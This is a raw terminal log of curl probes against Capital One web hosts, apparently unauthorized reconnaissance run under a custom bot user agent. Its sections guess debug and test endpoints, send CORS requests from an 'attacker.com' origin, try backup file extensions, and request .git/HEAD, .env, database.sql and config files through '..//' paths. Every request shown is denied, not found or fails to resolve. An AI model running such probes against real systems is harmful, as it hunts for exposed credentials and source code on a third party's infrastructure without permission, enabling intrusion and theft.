  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   109    0   109    0     0    169      0 --:--:-- --:--:-- --:--:--   169100   109    0   109    0     0    169      0 --:--:-- --:--:-- --:--:--   169
{"code":101305,"description":"Access forbidden. No CN/Api-Key available|No matching endpoint anonymous app"}

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://api.capitalone.com/v3/users/me/test'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:02 --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:03 --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:04 --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:05 --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:06 --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:07 --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:07 --:--:--     0100   109    0   109    0     0     13      0 --:--:--  0:00:08 --:--:--    26
{"description":"Access forbidden. No CN/Api-Key available|No matching endpoint anonymous app","code":101305}

$ curl -I --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -H 'Accept: */*' 'https://onlinebanking.capitalone.com/api/session' | grep -iE 'server|x-powered-by'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: onlinebanking.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://onlinebanking.capitalone.com/api/session/debug'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: onlinebanking.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://onlinebanking.capitalone.com/api/session/test'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: onlinebanking.capitalone.com

$ curl -I --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -H 'Accept: */*' 'https://apply.capitalone.com/api/application/status' | grep -iE 'server|x-powered-by'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0
Server: AmazonS3

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://apply.capitalone.com/api/application/status/debug'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   111    0   111    0     0    122      0 --:--:-- --:--:-- --:--:--   121100   111    0   111    0     0    121      0 --:--:-- --:--:-- --:--:--   121
<?xml version="1.0" encoding="UTF-8"?>
<Error><Code>AccessDenied</Code><Message>Access Denied</Message></Error>
$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://apply.capitalone.com/api/application/status/test'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   111    0   111    0     0    109      0 --:--:--  0:00:01 --:--:--   109100   111    0   111    0     0    109      0 --:--:--  0:00:01 --:--:--   109
<?xml version="1.0" encoding="UTF-8"?>
<Error><Code>AccessDenied</Code><Message>Access Denied</Message></Error>
$ curl -I --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -H 'Accept: */*' 'https://support.capitalone.com/api/v1/tickets' | grep -iE 'server|x-powered-by'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: support.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://support.capitalone.com/api/v1/tickets/debug'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: support.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://support.capitalone.com/api/v1/tickets/test'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: support.capitalone.com

$ curl -I --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -H 'Accept: */*' 'https://mobile.capitalone.com/api/config' | grep -iE 'server|x-powered-by'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0    76    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0    76    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://mobile.capitalone.com/api/config/debug'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100    76    0    76    0     0    308      0 --:--:-- --:--:-- --:--:--   308
{"id": "404", "text": "Invalid Request", "developerText": "Invalid Request"}
$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://mobile.capitalone.com/api/config/test'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100    76    0    76    0     0    126      0 --:--:-- --:--:-- --:--:--   126
{"id": "404", "text": "Invalid Request", "developerText": "Invalid Request"}
$ curl -I --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -H 'Accept: */*' 'https://identity.capitalone.com/auth/realms/capitalone/protocol/openid-connect/auth' | grep -iE 'server|x-powered-by'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://identity.capitalone.com/auth/realms/capitalone/protocol/openid-connect/auth/debug'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://identity.capitalone.com/auth/realms/capitalone/protocol/openid-connect/auth/test'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com


# CORS Testing
# Sun Jun 22 10:17:53 PM EEST 2025

$ curl -I --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -H 'Origin: https://attacker.com' 'https://api.capitalone.com/v3/users/me' | grep -i 'access-control'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0

$ curl -I --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -H 'Origin: https://attacker.com' 'https://onlinebanking.capitalone.com/api/session' | grep -i 'access-control'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: onlinebanking.capitalone.com

$ curl -I --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -H 'Origin: https://attacker.com' 'https://apply.capitalone.com/api/application/status' | grep -i 'access-control'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0

$ curl -I --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -H 'Origin: https://attacker.com' 'https://support.capitalone.com/api/v1/tickets' | grep -i 'access-control'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: support.capitalone.com

$ curl -I --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -H 'Origin: https://attacker.com' 'https://mobile.capitalone.com/api/config' | grep -i 'access-control'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0    76    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0

$ curl -I --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -H 'Origin: https://attacker.com' 'https://identity.capitalone.com/auth/realms/capitalone/protocol/openid-connect/auth' | grep -i 'access-control'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com


# File Extension Testing
# Sun Jun 22 10:17:55 PM EEST 2025

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://api.capitalone.com/v3/users/me.bak'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   721    0   721    0     0   1190      0 --:--:-- --:--:-- --:--:--  1191
 <div style="border: 3px solid #4991C5; font:1.5em; font-family:tahoma,calibri,arial; font-weight:bold; color:#1A4369; padding:5px; margin:10px; text-align:center">  The specified URL cannot be found. </div><!--0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234-->

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://api.capitalone.com/v3/users/me.old'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   721    0   721    0     0   1194      0 --:--:-- --:--:-- --:--:--  1193
 <div style="border: 3px solid #4991C5; font:1.5em; font-family:tahoma,calibri,arial; font-weight:bold; color:#1A4369; padding:5px; margin:10px; text-align:center">  The specified URL cannot be found. </div><!--0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234-->

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://api.capitalone.com/v3/users/me.tmp'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   109    0   109    0     0    151      0 --:--:-- --:--:-- --:--:--   151
{"code":101305,"description":"Access forbidden. No CN/Api-Key available|No matching endpoint anonymous app"}

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://api.capitalone.com/v3/users/me.swp'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   109    0   109    0     0    134      0 --:--:-- --:--:-- --:--:--   134100   109    0   109    0     0    134      0 --:--:-- --:--:-- --:--:--   134
{"code":101305,"description":"Access forbidden. No CN/Api-Key available|No matching endpoint anonymous app"}

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://api.capitalone.com/v3/users/me.zip'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   109    0   109    0     0    176      0 --:--:-- --:--:-- --:--:--   176
{"code":101305,"description":"Access forbidden. No CN/Api-Key available|No matching endpoint anonymous app"}

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://onlinebanking.capitalone.com/api/session.bak'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: onlinebanking.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://onlinebanking.capitalone.com/api/session.old'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: onlinebanking.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://onlinebanking.capitalone.com/api/session.tmp'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: onlinebanking.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://onlinebanking.capitalone.com/api/session.swp'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: onlinebanking.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://onlinebanking.capitalone.com/api/session.zip'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: onlinebanking.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://apply.capitalone.com/api/application/status.bak'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   111    0   111    0     0    104      0 --:--:--  0:00:01 --:--:--   104100   111    0   111    0     0    104      0 --:--:--  0:00:01 --:--:--   104
<?xml version="1.0" encoding="UTF-8"?>
<Error><Code>AccessDenied</Code><Message>Access Denied</Message></Error>
$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://apply.capitalone.com/api/application/status.old'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   111    0   111    0     0    121      0 --:--:-- --:--:-- --:--:--   121
<?xml version="1.0" encoding="UTF-8"?>
<Error><Code>AccessDenied</Code><Message>Access Denied</Message></Error>
$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://apply.capitalone.com/api/application/status.tmp'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   111    0   111    0     0    122      0 --:--:-- --:--:-- --:--:--   122100   111    0   111    0     0    107      0 --:--:--  0:00:01 --:--:--   107
<?xml version="1.0" encoding="UTF-8"?>
<Error><Code>AccessDenied</Code><Message>Access Denied</Message></Error>
$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://apply.capitalone.com/api/application/status.swp'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0100   111    0   111    0     0    101      0 --:--:--  0:00:01 --:--:--   101100   111    0   111    0     0    101      0 --:--:--  0:00:01 --:--:--   101
<?xml version="1.0" encoding="UTF-8"?>
<Error><Code>AccessDenied</Code><Message>Access Denied</Message></Error>
$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://apply.capitalone.com/api/application/status.zip'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   111    0   111    0     0    122      0 --:--:-- --:--:-- --:--:--   122
<?xml version="1.0" encoding="UTF-8"?>
<Error><Code>AccessDenied</Code><Message>Access Denied</Message></Error>
$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://support.capitalone.com/api/v1/tickets.bak'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: support.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://support.capitalone.com/api/v1/tickets.old'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: support.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://support.capitalone.com/api/v1/tickets.tmp'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: support.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://support.capitalone.com/api/v1/tickets.swp'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: support.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://support.capitalone.com/api/v1/tickets.zip'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: support.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://mobile.capitalone.com/api/config.bak'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   721    0   721    0     0   1412      0 --:--:-- --:--:-- --:--:--  1413
 <div style="border: 3px solid #4991C5; font:1.5em; font-family:tahoma,calibri,arial; font-weight:bold; color:#1A4369; padding:5px; margin:10px; text-align:center">  The specified URL cannot be found. </div><!--0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234-->

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://mobile.capitalone.com/api/config.old'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   721    0   721    0     0   1523      0 --:--:-- --:--:-- --:--:--  1521100   721    0   721    0     0   1521      0 --:--:-- --:--:-- --:--:--  1521
 <div style="border: 3px solid #4991C5; font:1.5em; font-family:tahoma,calibri,arial; font-weight:bold; color:#1A4369; padding:5px; margin:10px; text-align:center">  The specified URL cannot be found. </div><!--0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234-->

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://mobile.capitalone.com/api/config.tmp'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100    76    0    76    0     0    156      0 --:--:-- --:--:-- --:--:--   156
{"id": "404", "text": "Invalid Request", "developerText": "Invalid Request"}
$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://mobile.capitalone.com/api/config.swp'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100    76    0    76    0     0    257      0 --:--:-- --:--:-- --:--:--   257
{"id": "404", "text": "Invalid Request", "developerText": "Invalid Request"}
$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://mobile.capitalone.com/api/config.zip'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100    76    0    76    0     0    357      0 --:--:-- --:--:-- --:--:--   356100    76    0    76    0     0    356      0 --:--:-- --:--:-- --:--:--   356
{"id": "404", "text": "Invalid Request", "developerText": "Invalid Request"}
$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://identity.capitalone.com/auth/realms/capitalone/protocol/openid-connect/auth.bak'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://identity.capitalone.com/auth/realms/capitalone/protocol/openid-connect/auth.old'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://identity.capitalone.com/auth/realms/capitalone/protocol/openid-connect/auth.tmp'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://identity.capitalone.com/auth/realms/capitalone/protocol/openid-connect/auth.swp'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://identity.capitalone.com/auth/realms/capitalone/protocol/openid-connect/auth.zip'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com


# Backup File Testing
# Sun Jun 22 10:18:06 PM EEST 2025

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://api.capitalone.com/v3/users/me/..//.git/HEAD'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   721    0   721    0     0    980      0 --:--:-- --:--:-- --:--:--   980100   721    0   721    0     0    759      0 --:--:-- --:--:-- --:--:--   758
 <div style="border: 3px solid #4991C5; font:1.5em; font-family:tahoma,calibri,arial; font-weight:bold; color:#1A4369; padding:5px; margin:10px; text-align:center">  The specified URL cannot be found. </div><!--0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234-->

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://api.capitalone.com/v3/users/me/..//backup.zip'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   109    0   109    0     0    156      0 --:--:-- --:--:-- --:--:--   157
{"code":101305,"description":"Access forbidden. No CN/Api-Key available|No matching endpoint anonymous app"}

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://api.capitalone.com/v3/users/me/..//database.sql'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   109    0   109    0     0    180      0 --:--:-- --:--:-- --:--:--   180
{"description":"Access forbidden. No CN/Api-Key available|No matching endpoint anonymous app","code":101305}

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://api.capitalone.com/v3/users/me/..//config.bak'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   721    0   721    0     0   1198      0 --:--:-- --:--:-- --:--:--  1197100   721    0   721    0     0   1196      0 --:--:-- --:--:-- --:--:--  1195
 <div style="border: 3px solid #4991C5; font:1.5em; font-family:tahoma,calibri,arial; font-weight:bold; color:#1A4369; padding:5px; margin:10px; text-align:center">  The specified URL cannot be found. </div><!--0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234-->

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://api.capitalone.com/v3/users/me/..//.env'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   721    0   721    0     0   1344      0 --:--:-- --:--:-- --:--:--  1347
 <div style="border: 3px solid #4991C5; font:1.5em; font-family:tahoma,calibri,arial; font-weight:bold; color:#1A4369; padding:5px; margin:10px; text-align:center">  The specified URL cannot be found. </div><!--0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234-->

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://onlinebanking.capitalone.com/api/session/..//.git/HEAD'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: onlinebanking.capitalone.com

